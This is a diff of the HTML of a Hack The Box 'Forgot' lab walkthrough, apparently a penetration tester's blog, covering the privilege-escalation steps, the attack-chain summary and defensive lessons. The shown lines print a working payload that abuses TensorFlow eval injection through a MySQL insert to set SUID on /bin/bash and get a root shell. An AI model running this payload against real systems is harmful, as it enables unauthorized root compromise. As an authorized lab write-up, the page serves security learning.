 <p>The format expected by <code>preprocess_input_exprs_arg_string</code>:</p>
-<pre><code>varname=expression
+<pre tabindex="0" aria-label="Code or terminal block 29"><code>varname=expression
 </code></pre>
 <p>Our payload:</p>
-<pre><code>hello=exec("""\nimport os\nos.system("chmod +s /bin/bash")\nprint("%3Cscript%3Ealert()%3C%2Fscript%3E")""")
+<pre tabindex="0" aria-label="Code or terminal block 30"><code>hello=exec("""\nimport os\nos.system("chmod +s /bin/bash")\nprint("%3Cscript%3Ealert()%3C%2Fscript%3E")""")
 </code></pre>
 <p><strong>Breaking it down:</strong></p>
 <ul>
@@ -260,34 +261,34 @@ It fetches every <code>reason</code> from the <code>escalate</code> table</li>
 <p><strong>Why SUID on bash instead of a reverse shell?</strong><br>Setting SUID on <code>/bin/bash</code> is simpler, persistent, and doesn't require an open port. Once set, we run <code>/bin/bash -p</code> to get a root shell. The <code>-p</code> flag tells bash to preserve the elevated privileges (not drop SUID).</p>
 <hr>
 <h3 id="step-14-insert-the-payload-into-mysql">Step 14: Insert the Payload into MySQL</h3>
-<pre><code class="language-bash" data-language="bash">mysql -u diego -pREDACTED app -e 'insert into escalate values ("pwn","pwn","pwn","hello=exec(\"\"\"\\nimport os\\nos.system(\"chmod +s /bin/bash\")\\nprint(\\\"%3Cscript%3Ealert()%3C%2Fscript%3E\\\")\"\"\")")';
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">mysql -u diego -pREDACTED app -e 'insert into escalate values ("pwn","pwn","pwn","hello=exec(\"\"\"\\nimport os\\nos.system(\"chmod +s /bin/bash\")\\nprint(\\\"%3Cscript%3Ealert()%3C%2Fscript%3E\\\")\"\"\")")';
 </code></pre>
 <p><strong>Why MySQL directly?</strong><br>The web form for escalation has some filtering (links to external IPs get flagged). By going directly to the database with diego's credentials (found in <code>ml_security.py</code> itself), we bypass any web-layer filtering completely.</p>
 <p><strong>How we got the DB credentials:</strong><br>They're hardcoded in <code>ml_security.py</code>:</p>
-<pre><code class="language-python" data-language="python">conn = mysql.connector.connect(host='localhost', database='app', user='diego', password='REDACTED')
+<pre tabindex="0" aria-label="python code or terminal block 32"><code class="language-python" data-language="python">conn = mysql.connector.connect(host='localhost', database='app', user='diego', password='REDACTED')
 </code></pre>
 <p>The same password diego uses for SSH is also the DB password.</p>
 <hr>
 <h3 id="step-15-trigger-the-script-as-root">Step 15: Trigger the Script as Root</h3>
-<pre><code class="language-bash" data-language="bash">sudo /opt/security/ml_security.py
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">sudo /opt/security/ml_security.py
 </code></pre>
 <p>The script runs, fetches our payload from the database, the ML models score it high (XSS content), and <code>preprocess_input_exprs_arg_string</code> calls <code>eval()</code> on it as root. Our <code>os.system("chmod +s /bin/bash")</code> executes.</p>
 <hr>
 <h3 id="step-16-verify-suid-and-get-root-shell">Step 16: Verify SUID and Get Root Shell</h3>
-<pre><code class="language-bash" data-language="bash">ls -la /bin/bash
+<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">ls -la /bin/bash
 </code></pre>
-<pre><code>-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+<pre tabindex="0" aria-label="Code or terminal block 35"><code>-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
 </code></pre>
 <p>The <code>s</code> in the permissions means SUID is set. Now:</p>
-<pre><code class="language-bash" data-language="bash">/bin/bash -p
+<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">/bin/bash -p
 </code></pre>
-<pre><code>bash-5.0# cat /root/root.txt
+<pre tabindex="0" aria-label="Code or terminal block 37"><code>bash-5.0# cat /root/root.txt
 1b7818[redacted]911289e
 </code></pre>
 <p>Root flag captured.</p>
 <hr>
 <h2 id="full-attack-chain-summary">Full Attack Chain Summary</h2>
-<pre><code>[Recon]
+<pre tabindex="0" aria-label="Code or terminal block 38"><code>[Recon]
 nmap → ports 22, 80
 curl source → username: robert-dev-367120
           ↓
@@ -318,9 +319,9 @@ sudo ml_security.py → CVE-2022-29216 eval() injection via MySQL
 <h3 id="5-scripts-that-run-as-root-must-be-treated-as-root-itself">5. Scripts that run as root must be treated as root itself</h3>
 <p>Any script with <code>sudo NOPASSWD</code> is as dangerous as a root shell if it processes attacker-controlled input. <code>eval()</code> with user data is almost always exploitable. <code>safe=False</code> is never safe.</p>
 <h3 id="6-don-t-poison-your-own-cache">6. Don't poison your own cache</h3>
-<p>When performing cache deception, never visit the target URL before the victim does. Your unauthenticated request will cache a redirect, poisoning the cache and preventing the admin's response from ever being stored.</p>b:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]
-c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-fighter-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Fighter Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:14:00.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ghoul-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Ghoul Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T13:12:45.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-13:T576,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/#article","headline":"Hack The Box: Forgot Walkthrough","description":"Host-header injection takes over a user account, web cache deception leaks SSH credentials from an administrator view, and unsafe TensorFlow expression handling in a sudo script executes a database-supplied payload as root.","url":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/","datePublished":"2026-06-11T15:09:33.000Z","dateModified":"2026-06-11T15:09:33.000Z","wordCount":2322,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/e1192deda99be41a564a10650e5eacae6a2828b4/HTB-Forgot.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-forgot-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Forgot Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
-f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
-16:null
+<p>When performing cache deception, never visit the target URL before the victim does. Your unauthenticated request will cache a redirect, poisoning the cache and preventing the admin's response from ever being stored.</p>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"overview","label":"Overview"},{"id":"phase-1-reconnaissance","label":"Phase 1: Reconnaissance"},{"id":"phase-2-host-header-injection","label":"Phase 2: Host Header Injection"},{"id":"phase-3-web-cache-deception","label":"Phase 3: Web Cache Deception"},{"id":"phase-4-initial-access","label":"Phase 4: Initial Access"},{"id":"phase-5-privilege-escalation","label":"Phase 5: Privilege Escalation"},{"id":"full-attack-chain-summary","label":"Full Attack Chain Summary"},{"id":"key-lessons","label":"Key Lessons"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/e1192deda99be41a564a10650e5eacae6a2828b4/HTB-Forgot.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit e1192deda99b",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Forgot, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/forgot","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}],["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-fighter-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Fighter Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:14:00.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ghoul-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Ghoul Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T13:12:45.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T576,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/#article","headline":"Hack The Box: Forgot Walkthrough","description":"Host-header injection takes over a user account, web cache deception leaks SSH credentials from an administrator view, and unsafe TensorFlow expression handling in a sudo script executes a database-supplied payload as root.","url":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/","datePublished":"2026-06-11T15:09:33.000Z","dateModified":"2026-06-11T15:09:33.000Z","wordCount":2322,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/e1192deda99be41a564a10650e5eacae6a2828b4/HTB-Forgot.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-forgot-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Forgot Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-forgot-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
